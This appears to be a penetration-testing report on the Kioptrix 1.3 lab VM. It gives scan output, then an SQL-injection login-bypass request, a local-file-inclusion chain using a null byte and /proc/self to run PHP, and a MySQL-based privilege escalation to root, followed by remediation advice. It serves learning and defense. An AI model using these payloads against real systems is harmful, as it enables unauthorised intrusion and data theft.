# Application Penetration Testing Report Kioptrix-v1.3


## Intoduction and Objectives

The application penetration testing report contains efforts that were conducted in order to find vulnerabilities, which a threat actor can use to gain control over the web application. For the scope of this penetration test, the web application was deployed in the Virualized Enviorement with no additional information about the system.

IP address: **10.10.10.100**

The assumption with severity calculation was made that the system is intended to go public soon.

## Summary


### High-Level Summary

This chapter presents the high overview of the results found during the application penetration test.
The chart and table below presents the findings with the coresponding severity.

![VULN_SEV_KIOPTRIX](../master/static/barchart_kioptrix.png)

Vulnerabilities with critical severity allow the attacker to remotely execute code on the system or to leak  data with extremly high likehood to exploit e.g. Internet facing application without authentication. Vulnerabilities with severity high allow the attacker to take over the account, leak data with relativly high likelihood to exploit. Vulnerabilities with severity medium can lead to eavasdropping of the communication between client and application, secret leakage and denial of service. Vulnerabilities with severity low can assist in exploitation of higher severity vulnerabilities.
For further reading there were CWE-ID provided.


|No.|Vulnerability									|Severity		|CWE-ID		|
|---|-------------									|--------		|------		|
|1	|SQL Injection									|**Critical**	|CWE-89		|
|2	|Local File Inclusion							|**High** 		|CWE-98		|
|3	|Weak Passwords									|Medium			|CWE-521	|
|4	|Cleartext Storage of Passwords					|Medium			|CWE-312	|
|5	|Unecnrypted communication						|Medium			|CWE-319	|
|6	|HTTP TRACE Enabled								|Low			|CWE-749	|
|7	|Anti-Clickjacking not presents					|Low			|CWE-1021	|
|8	|Cookie without httponly flag					|Low			|CWE-1004	|
|9	|Information exposure through directory path	|Low			|CWE-200	|

For the detailed description of each vulnerability, please refer to CWE-ID.


### Detailed Summary

This chapter presents the detailed summary of vulnerable endpoints. The chapter is more dedicated to technical people who are interested in remediation process. Table below presents the vulnerable HTTP endpoints with the HTTP method, parameters and Body.


|No.|Vulnerable Endpoint	|HTTP METHOD|Params			|Body										  	 |
|---|-------------------	|-----------|------			|----											 |
|1	|/checklogin.php		|POST		|-   			|myusername=test&mypassword=**test**&Submit=Login|
|2	|/member.php			|GET		|**username**	|-												 |

For remaining vulnerabilities, there are no vulnerable parameters or body but weakness lays in webserver configuration, HTTP header or general policy.

**Numbers 3 and 4** - refers to weak password policy

**Number 5** - Unecrypted communication refers to sending sensitive data (username and password) over unencrypted channel. When implementing the encryption in transit, appropiate HTTP headers should be set up to ensure the strong configuration of Http over tls. The details can be found in Recommendation chapter.

**Number 6** - HTTP Trace Enabled refers to HTTP method (Trace) that refelects the input send by the user. The vulnerability allows the attacker to bypass native browser cookie protection (if in place e.g. httponly), to leak the senstive cookie by Cross-site scripting attack.

**Number 7** - vulnerability allows the attacker to render content of the website in the context of other domain owned by attacker. Unless intended as functionallity, appropiate HTTP Header has to be set up to limit the rendering of the website in different browser context.

**Number 8** - the cookie missing httponly flag which in case of Cross-site scripting attack allow the attacker to easly hijack the cookie and take over user session.

**Number 9** - the information is exposed through the directory names in the web application.

## Methodology

The testing methodology used was based on OWASP Applcation Security Verification Standard 4.0


### Information Gathering & Service Enumeration

To idetify the open ports and running services the nmap scan was run with NSE scripts.

```
root@kali:~# nmap -sS -sV -T4 -A 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 05:42 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.10.100
Host is up (0.00066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.17 (Ubuntu)
|_http-title: Welcome to this Site!
MAC Address: 08:00:27:3D:16:A2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.66 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```

There are 2 tcp ports open on the machine. On port 22 tcp there is ssh service running. Port 80 tcp, exposed and outdated apache server running. Also, nmap has identified the operating system version as Linux kernel 2.6. The next target would be the http service on port 80 tcp.


```
root@kali:~# nikto -h http://10.10.10.100
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.100
+ Target Hostname:    10.10.10.100
+ Target Port:        80
+ Start Time:         2019-08-23 05:44:04 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ /info/: Output from the phpinfo() function was found.
+ OSVDB-3092: /info/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /register/: This might be interesting...
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /login.php: Admin login page/section found.
+ 8310 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2019-08-23 05:44:15 (GMT-4) (11 seconds)
---------------------------------------------------------------------------
```

At this moment the nikto scan has idetify the following vulnerabilities: communication is not encrypted (number 5), HTTP Trace method is active (number 6), Anti-clickjacking header is not present (number 7), Cookie PHPSESSID created without the httponly flag (number 8).

Also please note that nikto discover **outdated** version of PHP and Apache.

To enumerate directories/files in the web application dirb will be used.
```
root@kali:~# dirb http://10.10.10.100

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug 23 05:45:10 2019
URL_BASE: http://10.10.10.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.100/ ----
+ http://10.10.10.100/activate (CODE:302|SIZE:0)                               
==> DIRECTORY: http://10.10.10.100/blog/                                       
+ http://10.10.10.100/cgi-bin/ (CODE:403|SIZE:288)                             
==> DIRECTORY: http://10.10.10.100/includes/                                   
+ http://10.10.10.100/index (CODE:200|SIZE:854)                                
+ http://10.10.10.100/index.php (CODE:200|SIZE:854)                            
+ http://10.10.10.100/info (CODE:200|SIZE:50171)                               
+ http://10.10.10.100/info.php (CODE:200|SIZE:50040)                           
+ http://10.10.10.100/login (CODE:200|SIZE:1174)                               
+ http://10.10.10.100/register (CODE:200|SIZE:1562)                            
+ http://10.10.10.100/server-status (CODE:403|SIZE:293)                        
                                                                               
---- Entering directory: http://10.10.10.100/blog/ ----
+ http://10.10.10.100/blog/add (CODE:302|SIZE:0)                               
+ http://10.10.10.100/blog/atom (CODE:200|SIZE:1062)                           
+ http://10.10.10.100/blog/categories (CODE:302|SIZE:0)                        
+ http://10.10.10.100/blog/comments (CODE:302|SIZE:0)                          
==> DIRECTORY: http://10.10.10.100/blog/config/                                
+ http://10.10.10.100/blog/contact (CODE:200|SIZE:6001)                        
==> DIRECTORY: http://10.10.10.100/blog/content/                               
+ http://10.10.10.100/blog/delete (CODE:302|SIZE:0)                            
==> DIRECTORY: http://10.10.10.100/blog/docs/                                  
==> DIRECTORY: http://10.10.10.100/blog/flash/                                 
==> DIRECTORY: http://10.10.10.100/blog/images/                                
+ http://10.10.10.100/blog/index (CODE:200|SIZE:8094)                          
+ http://10.10.10.100/blog/index.php (CODE:200|SIZE:8094)                      
+ http://10.10.10.100/blog/info (CODE:302|SIZE:0)                              
+ http://10.10.10.100/blog/info.php (CODE:302|SIZE:0)                          
==> DIRECTORY: http://10.10.10.100/blog/interface/                             
==> DIRECTORY: http://10.10.10.100/blog/languages/                             
+ http://10.10.10.100/blog/login (CODE:200|SIZE:5750)                          
+ http://10.10.10.100/blog/logout (CODE:302|SIZE:0)                            
+ http://10.10.10.100/blog/options (CODE:302|SIZE:0)                           
+ http://10.10.10.100/blog/rdf (CODE:200|SIZE:1411)                            
+ http://10.10.10.100/blog/rss (CODE:200|SIZE:1237)                            
==> DIRECTORY: http://10.10.10.100/blog/scripts/                               
+ http://10.10.10.100/blog/search (CODE:200|SIZE:5034)                         
+ http://10.10.10.100/blog/setup (CODE:302|SIZE:0)                             
+ http://10.10.10.100/blog/static (CODE:302|SIZE:0)                            
+ http://10.10.10.100/blog/stats (CODE:200|SIZE:5392)                          
==> DIRECTORY: http://10.10.10.100/blog/themes/                                
+ http://10.10.10.100/blog/trackback (CODE:302|SIZE:0)                         
+ http://10.10.10.100/blog/upgrade (CODE:302|SIZE:0)                           
                                                                               
---- Entering directory: http://10.10.10.100/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/flash/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/interface/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.100/blog/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Aug 23 05:45:16 2019
DOWNLOADED: 9224 - FOUND: 30

```

The valueable information from the dirb scan is that potentially there is a user **john** register in the web application which corresponds to **number 9** vulnerability.

### Testing and Exploitation

Further testing will be handled on the http website running on port 80 tcp. Then the communication was intercepted with the usage of local web proxy Burp Suite. This is how main page looks like.

![MAIN](../master/static/kioptrix_main.jpg)

Since we have identified that the user john is valid, we may try to login to the application by sending the following POST request.

```
POST /checklogin.php HTTP/1.1
Host: 192.168.23.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.23.131/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Cookie: PHPSESSID=46338c8d8f8b18d8ece9ae9088156bc6
Connection: close
Upgrade-Insecure-Requests: 1
 
myusername=john&mypassword=test&Submit=Login


```

The authentication failed. At this point the attacker will try to bypass authentication to continue the testing. The following payload was sent to the webserver to check for SQL injection vulnerability.

```
POST /checklogin.php HTTP/1.1
Host: 192.168.23.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.23.131/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Cookie: PHPSESSID=46338c8d8f8b18d8ece9ae9088156bc6
Connection: close
Upgrade-Insecure-Requests: 1
 
myusername=john&mypassword=%27+OR+%27%27%3D%27&Submit=Login


```

The payload resulted in successful login and redirection to the user page. Where we can see the username and password, which is already a sign of vulnerability **number 4**.

![USER](../master/static/kioptrix_userpage.jpg)

Since, the SQL injection vulnerability was idetified the attacker would try to extract as much information as possible from the web application. For database dumping, there maybe be automated tool used called sqlmap. The sqlmap will dump all the neccassary data from the database. During the penetration testing there was the **members** table dumped.

![MEMBERS](../master/static/kioptrix_members.jpg)

At this point we can have discovered the vulnerabilities **number 3 and 4**, the passwords were stored in the plaintext and also the password policy was not enforced, the password of user john is rather weak and can be ealy bruteforced.

The discovered credentials has been checked for authentication through ssh service running on port 22 tcp. As presented below, the credentials have given access to the restricted shell which was easly escaped to full bash shell.

![SSH_ROBERT](../master/static/kioptrix_ssh_robert.jpg)

At this point the severity of SQL Injection vulnerability can be state as **critical**, since it allows for remote code execution, without previous authentication/authorization.

Then, the testing has continue to discover new vulnerabilities remaining in web application.

![MEMBERS](../master/static/kioptrix_members.jpg)

One can see that there is a parameter username=john supplied in HTTP GET request. From the previous **dirb** scan the attacker knows that there is john.php and from the nikto scan we know that \*.php extenstions are mapped to no extenstions. At this point we can assumme that the application takes the input from the user and injects the template to the execute php code. The best way to check if vulnerability exists is to check if it is possible to read some files from the disk e.g. /etc/passwd.

![ETC](../master/static/kioptrix_etc.jpg)

It seems that the application cuts off the /etc, the attacker might try to duplicate /etc.


![ETC2](../master/static/kioptrix_etc2.jpg)

Now, it seems that the application appends .php at the end of the filepath. To end the string before .php is appended, one must submit the NULL byte indicating that the string has ended.

![ETC3](../master/static/kioptrix_etc3.jpg)

At this point the attacker is able to read any file from the disk with the privialges of web application. The attacker might also look for the ways to leverage the vulnerability to achive the remote code execution. With the possibility to read any files from the disk, in order to execute php code one need to upload the code anywhere in the disk.

Luckly in Linux, we have got the concept that everything is a file. Saying there are pseudofiles on the disk that are mapped to certain spaces in the memory, we can find those files in /proc directory. Additional the pseudofolder self is the pointer to the memory of current process.


![PROC](../master/static/kioptrix_proc.jpg)

At this point the attacker will try to bruteforce the appropiate PID. One may use the Intruder feature to achive that.

![INTRUDER](../master/static/kioptrix_proc2.jpg)

one may say that PID 9 has significatly lower length than other PIDs.Here is how the content looks like.

![PROC](../master/static/kioptrix_proc3.jpg)

So the data from previous request in the same session has been saved to the pseudofile on the disk. This is the input fully control by the attacker. To prove the exploitation, the following php code will be executed.

```
<?php phpinfo(); ?>
```

The payload has been URL encoded to ensure proper delivery and interpretation by webserver.

![PHPINFO](../master/static/kioptrix_phpinfo.jpg)

The vulnerability was assigned with severity **high**, since it requires previous authentication.


### Appendix - Privilage Escalation

After achiveing low privilaged user shell in the OS. The attacker will look for privilage escalation. From the discovery phase we know that it is possible to run the kernel expoit, however it is recommened to look for wrongly configured services, cronjobs, processes with wrongly set permissions, setuid files since the kernel expoits might affect the avaiability of services.

The attacker found out that there is a mysqld process runinng as with root permission.

![Mysql1](../master/static/kioptrix_mysql1.jpg)

Also in the web application configuration files the attacker found the login to mysql root account.

![Mysql2](../master/static/kioptrix_mysql2.jpg)

With that knowledge, the attacker might easly login to mysql running on localhost with mysql user root credentials and use builtin mysql function to execute system commands with the privilages of current running process. The attacker can change the permissions of currently login user by adding it to admin group or create new user in a system with admin privilages.

![Mysql3](../master/static/kioptrix_mysql3.jpg)
The attacker can login as root, the server has been fully compromised.
![Root](../master/static/kioptrix_root.jpg)

## Recommendations

Last chapter describes the recommendation for remediation of each discovered vulnerability. Additionally there has been some enhancement proposed to ensure the highest risk mitigation.

**1. SQL Injection**

Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.
Example using PDO (for any supported database driver):

```
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');

$stmt->execute(array('name' => $name));
```

**2. Local File Inclusion**

To protect the application from this weakness it is advised to follow these instructions:

Never use attacker controlled data as a filename or part of the filename when including files. If inclusion of file should be based on the user's choice, use preset conditions instead of using filenames.
Perform whitelist checks when including files using user controlled input.
Use sandbox environments (e.g. jail, chroot) that enforce strict boundaries between the process and the operating system.
Use PHP configuration to limit the attack surface. Turn off the allow_url_fopen option which limits the ability to include files from a remote location.
As a temporary solution we strongly recommend blocking access to vulnerable script until the issue is resolved. This can be achieved either using native functionality of the webserver or changing system access permission to file.


**3. Weak Passwords**

Enforce password policy for the users. Do not allow users to create the account with weak passwords. Regulary audit user passwords.


**4.Cleartext Storage of Passwords**

Never store user passwords in cleartext. Use secure hashing functions with salt. For details refer to php guideline:
https://www.php.net/manual/en/faq.passwords.php

**5. Unecnrypted communication**

Implement strong TLS configuration, send senstive data only through encrypted channel. The tester recommends to apply TLS1.2+ (date: 22/08/2019). Also it is recommended to set up HSTS-HTTP header and add the flag secure to the sensitive cookie.

**6. HTTP TRACE Enabled**

Disbale HTTP TRACE method in Apache configuration. There should be following line added to httpd.conf
```
TraceEnable Off
```

**7. Anti-Clickjacking not presents**

Apply the UI render restriction by adding X-Frame-Options header to each response. There should be following line added to httpd.conf

```
Header always append X-Frame-Options SAMEORIGIN
```

**8. Cookie without httponly flag**

Protect the senstive cookie by applying the flag HttpOnly. The flag should be append in the time for cookie creation in PHP code.


**9. Information exposure through directory path**

The information about the usernames is disclosed by filename (e.g.john.php). Do not use the username to create user related files/scripts.


**10. Additional**

- Implement patch management policy. Regulary apply software updates. Upgrade Apache Webserver, PHP, Linux Kernel.

- Enable X-XSS-Protection Header

- Enable X-Content-Type-Options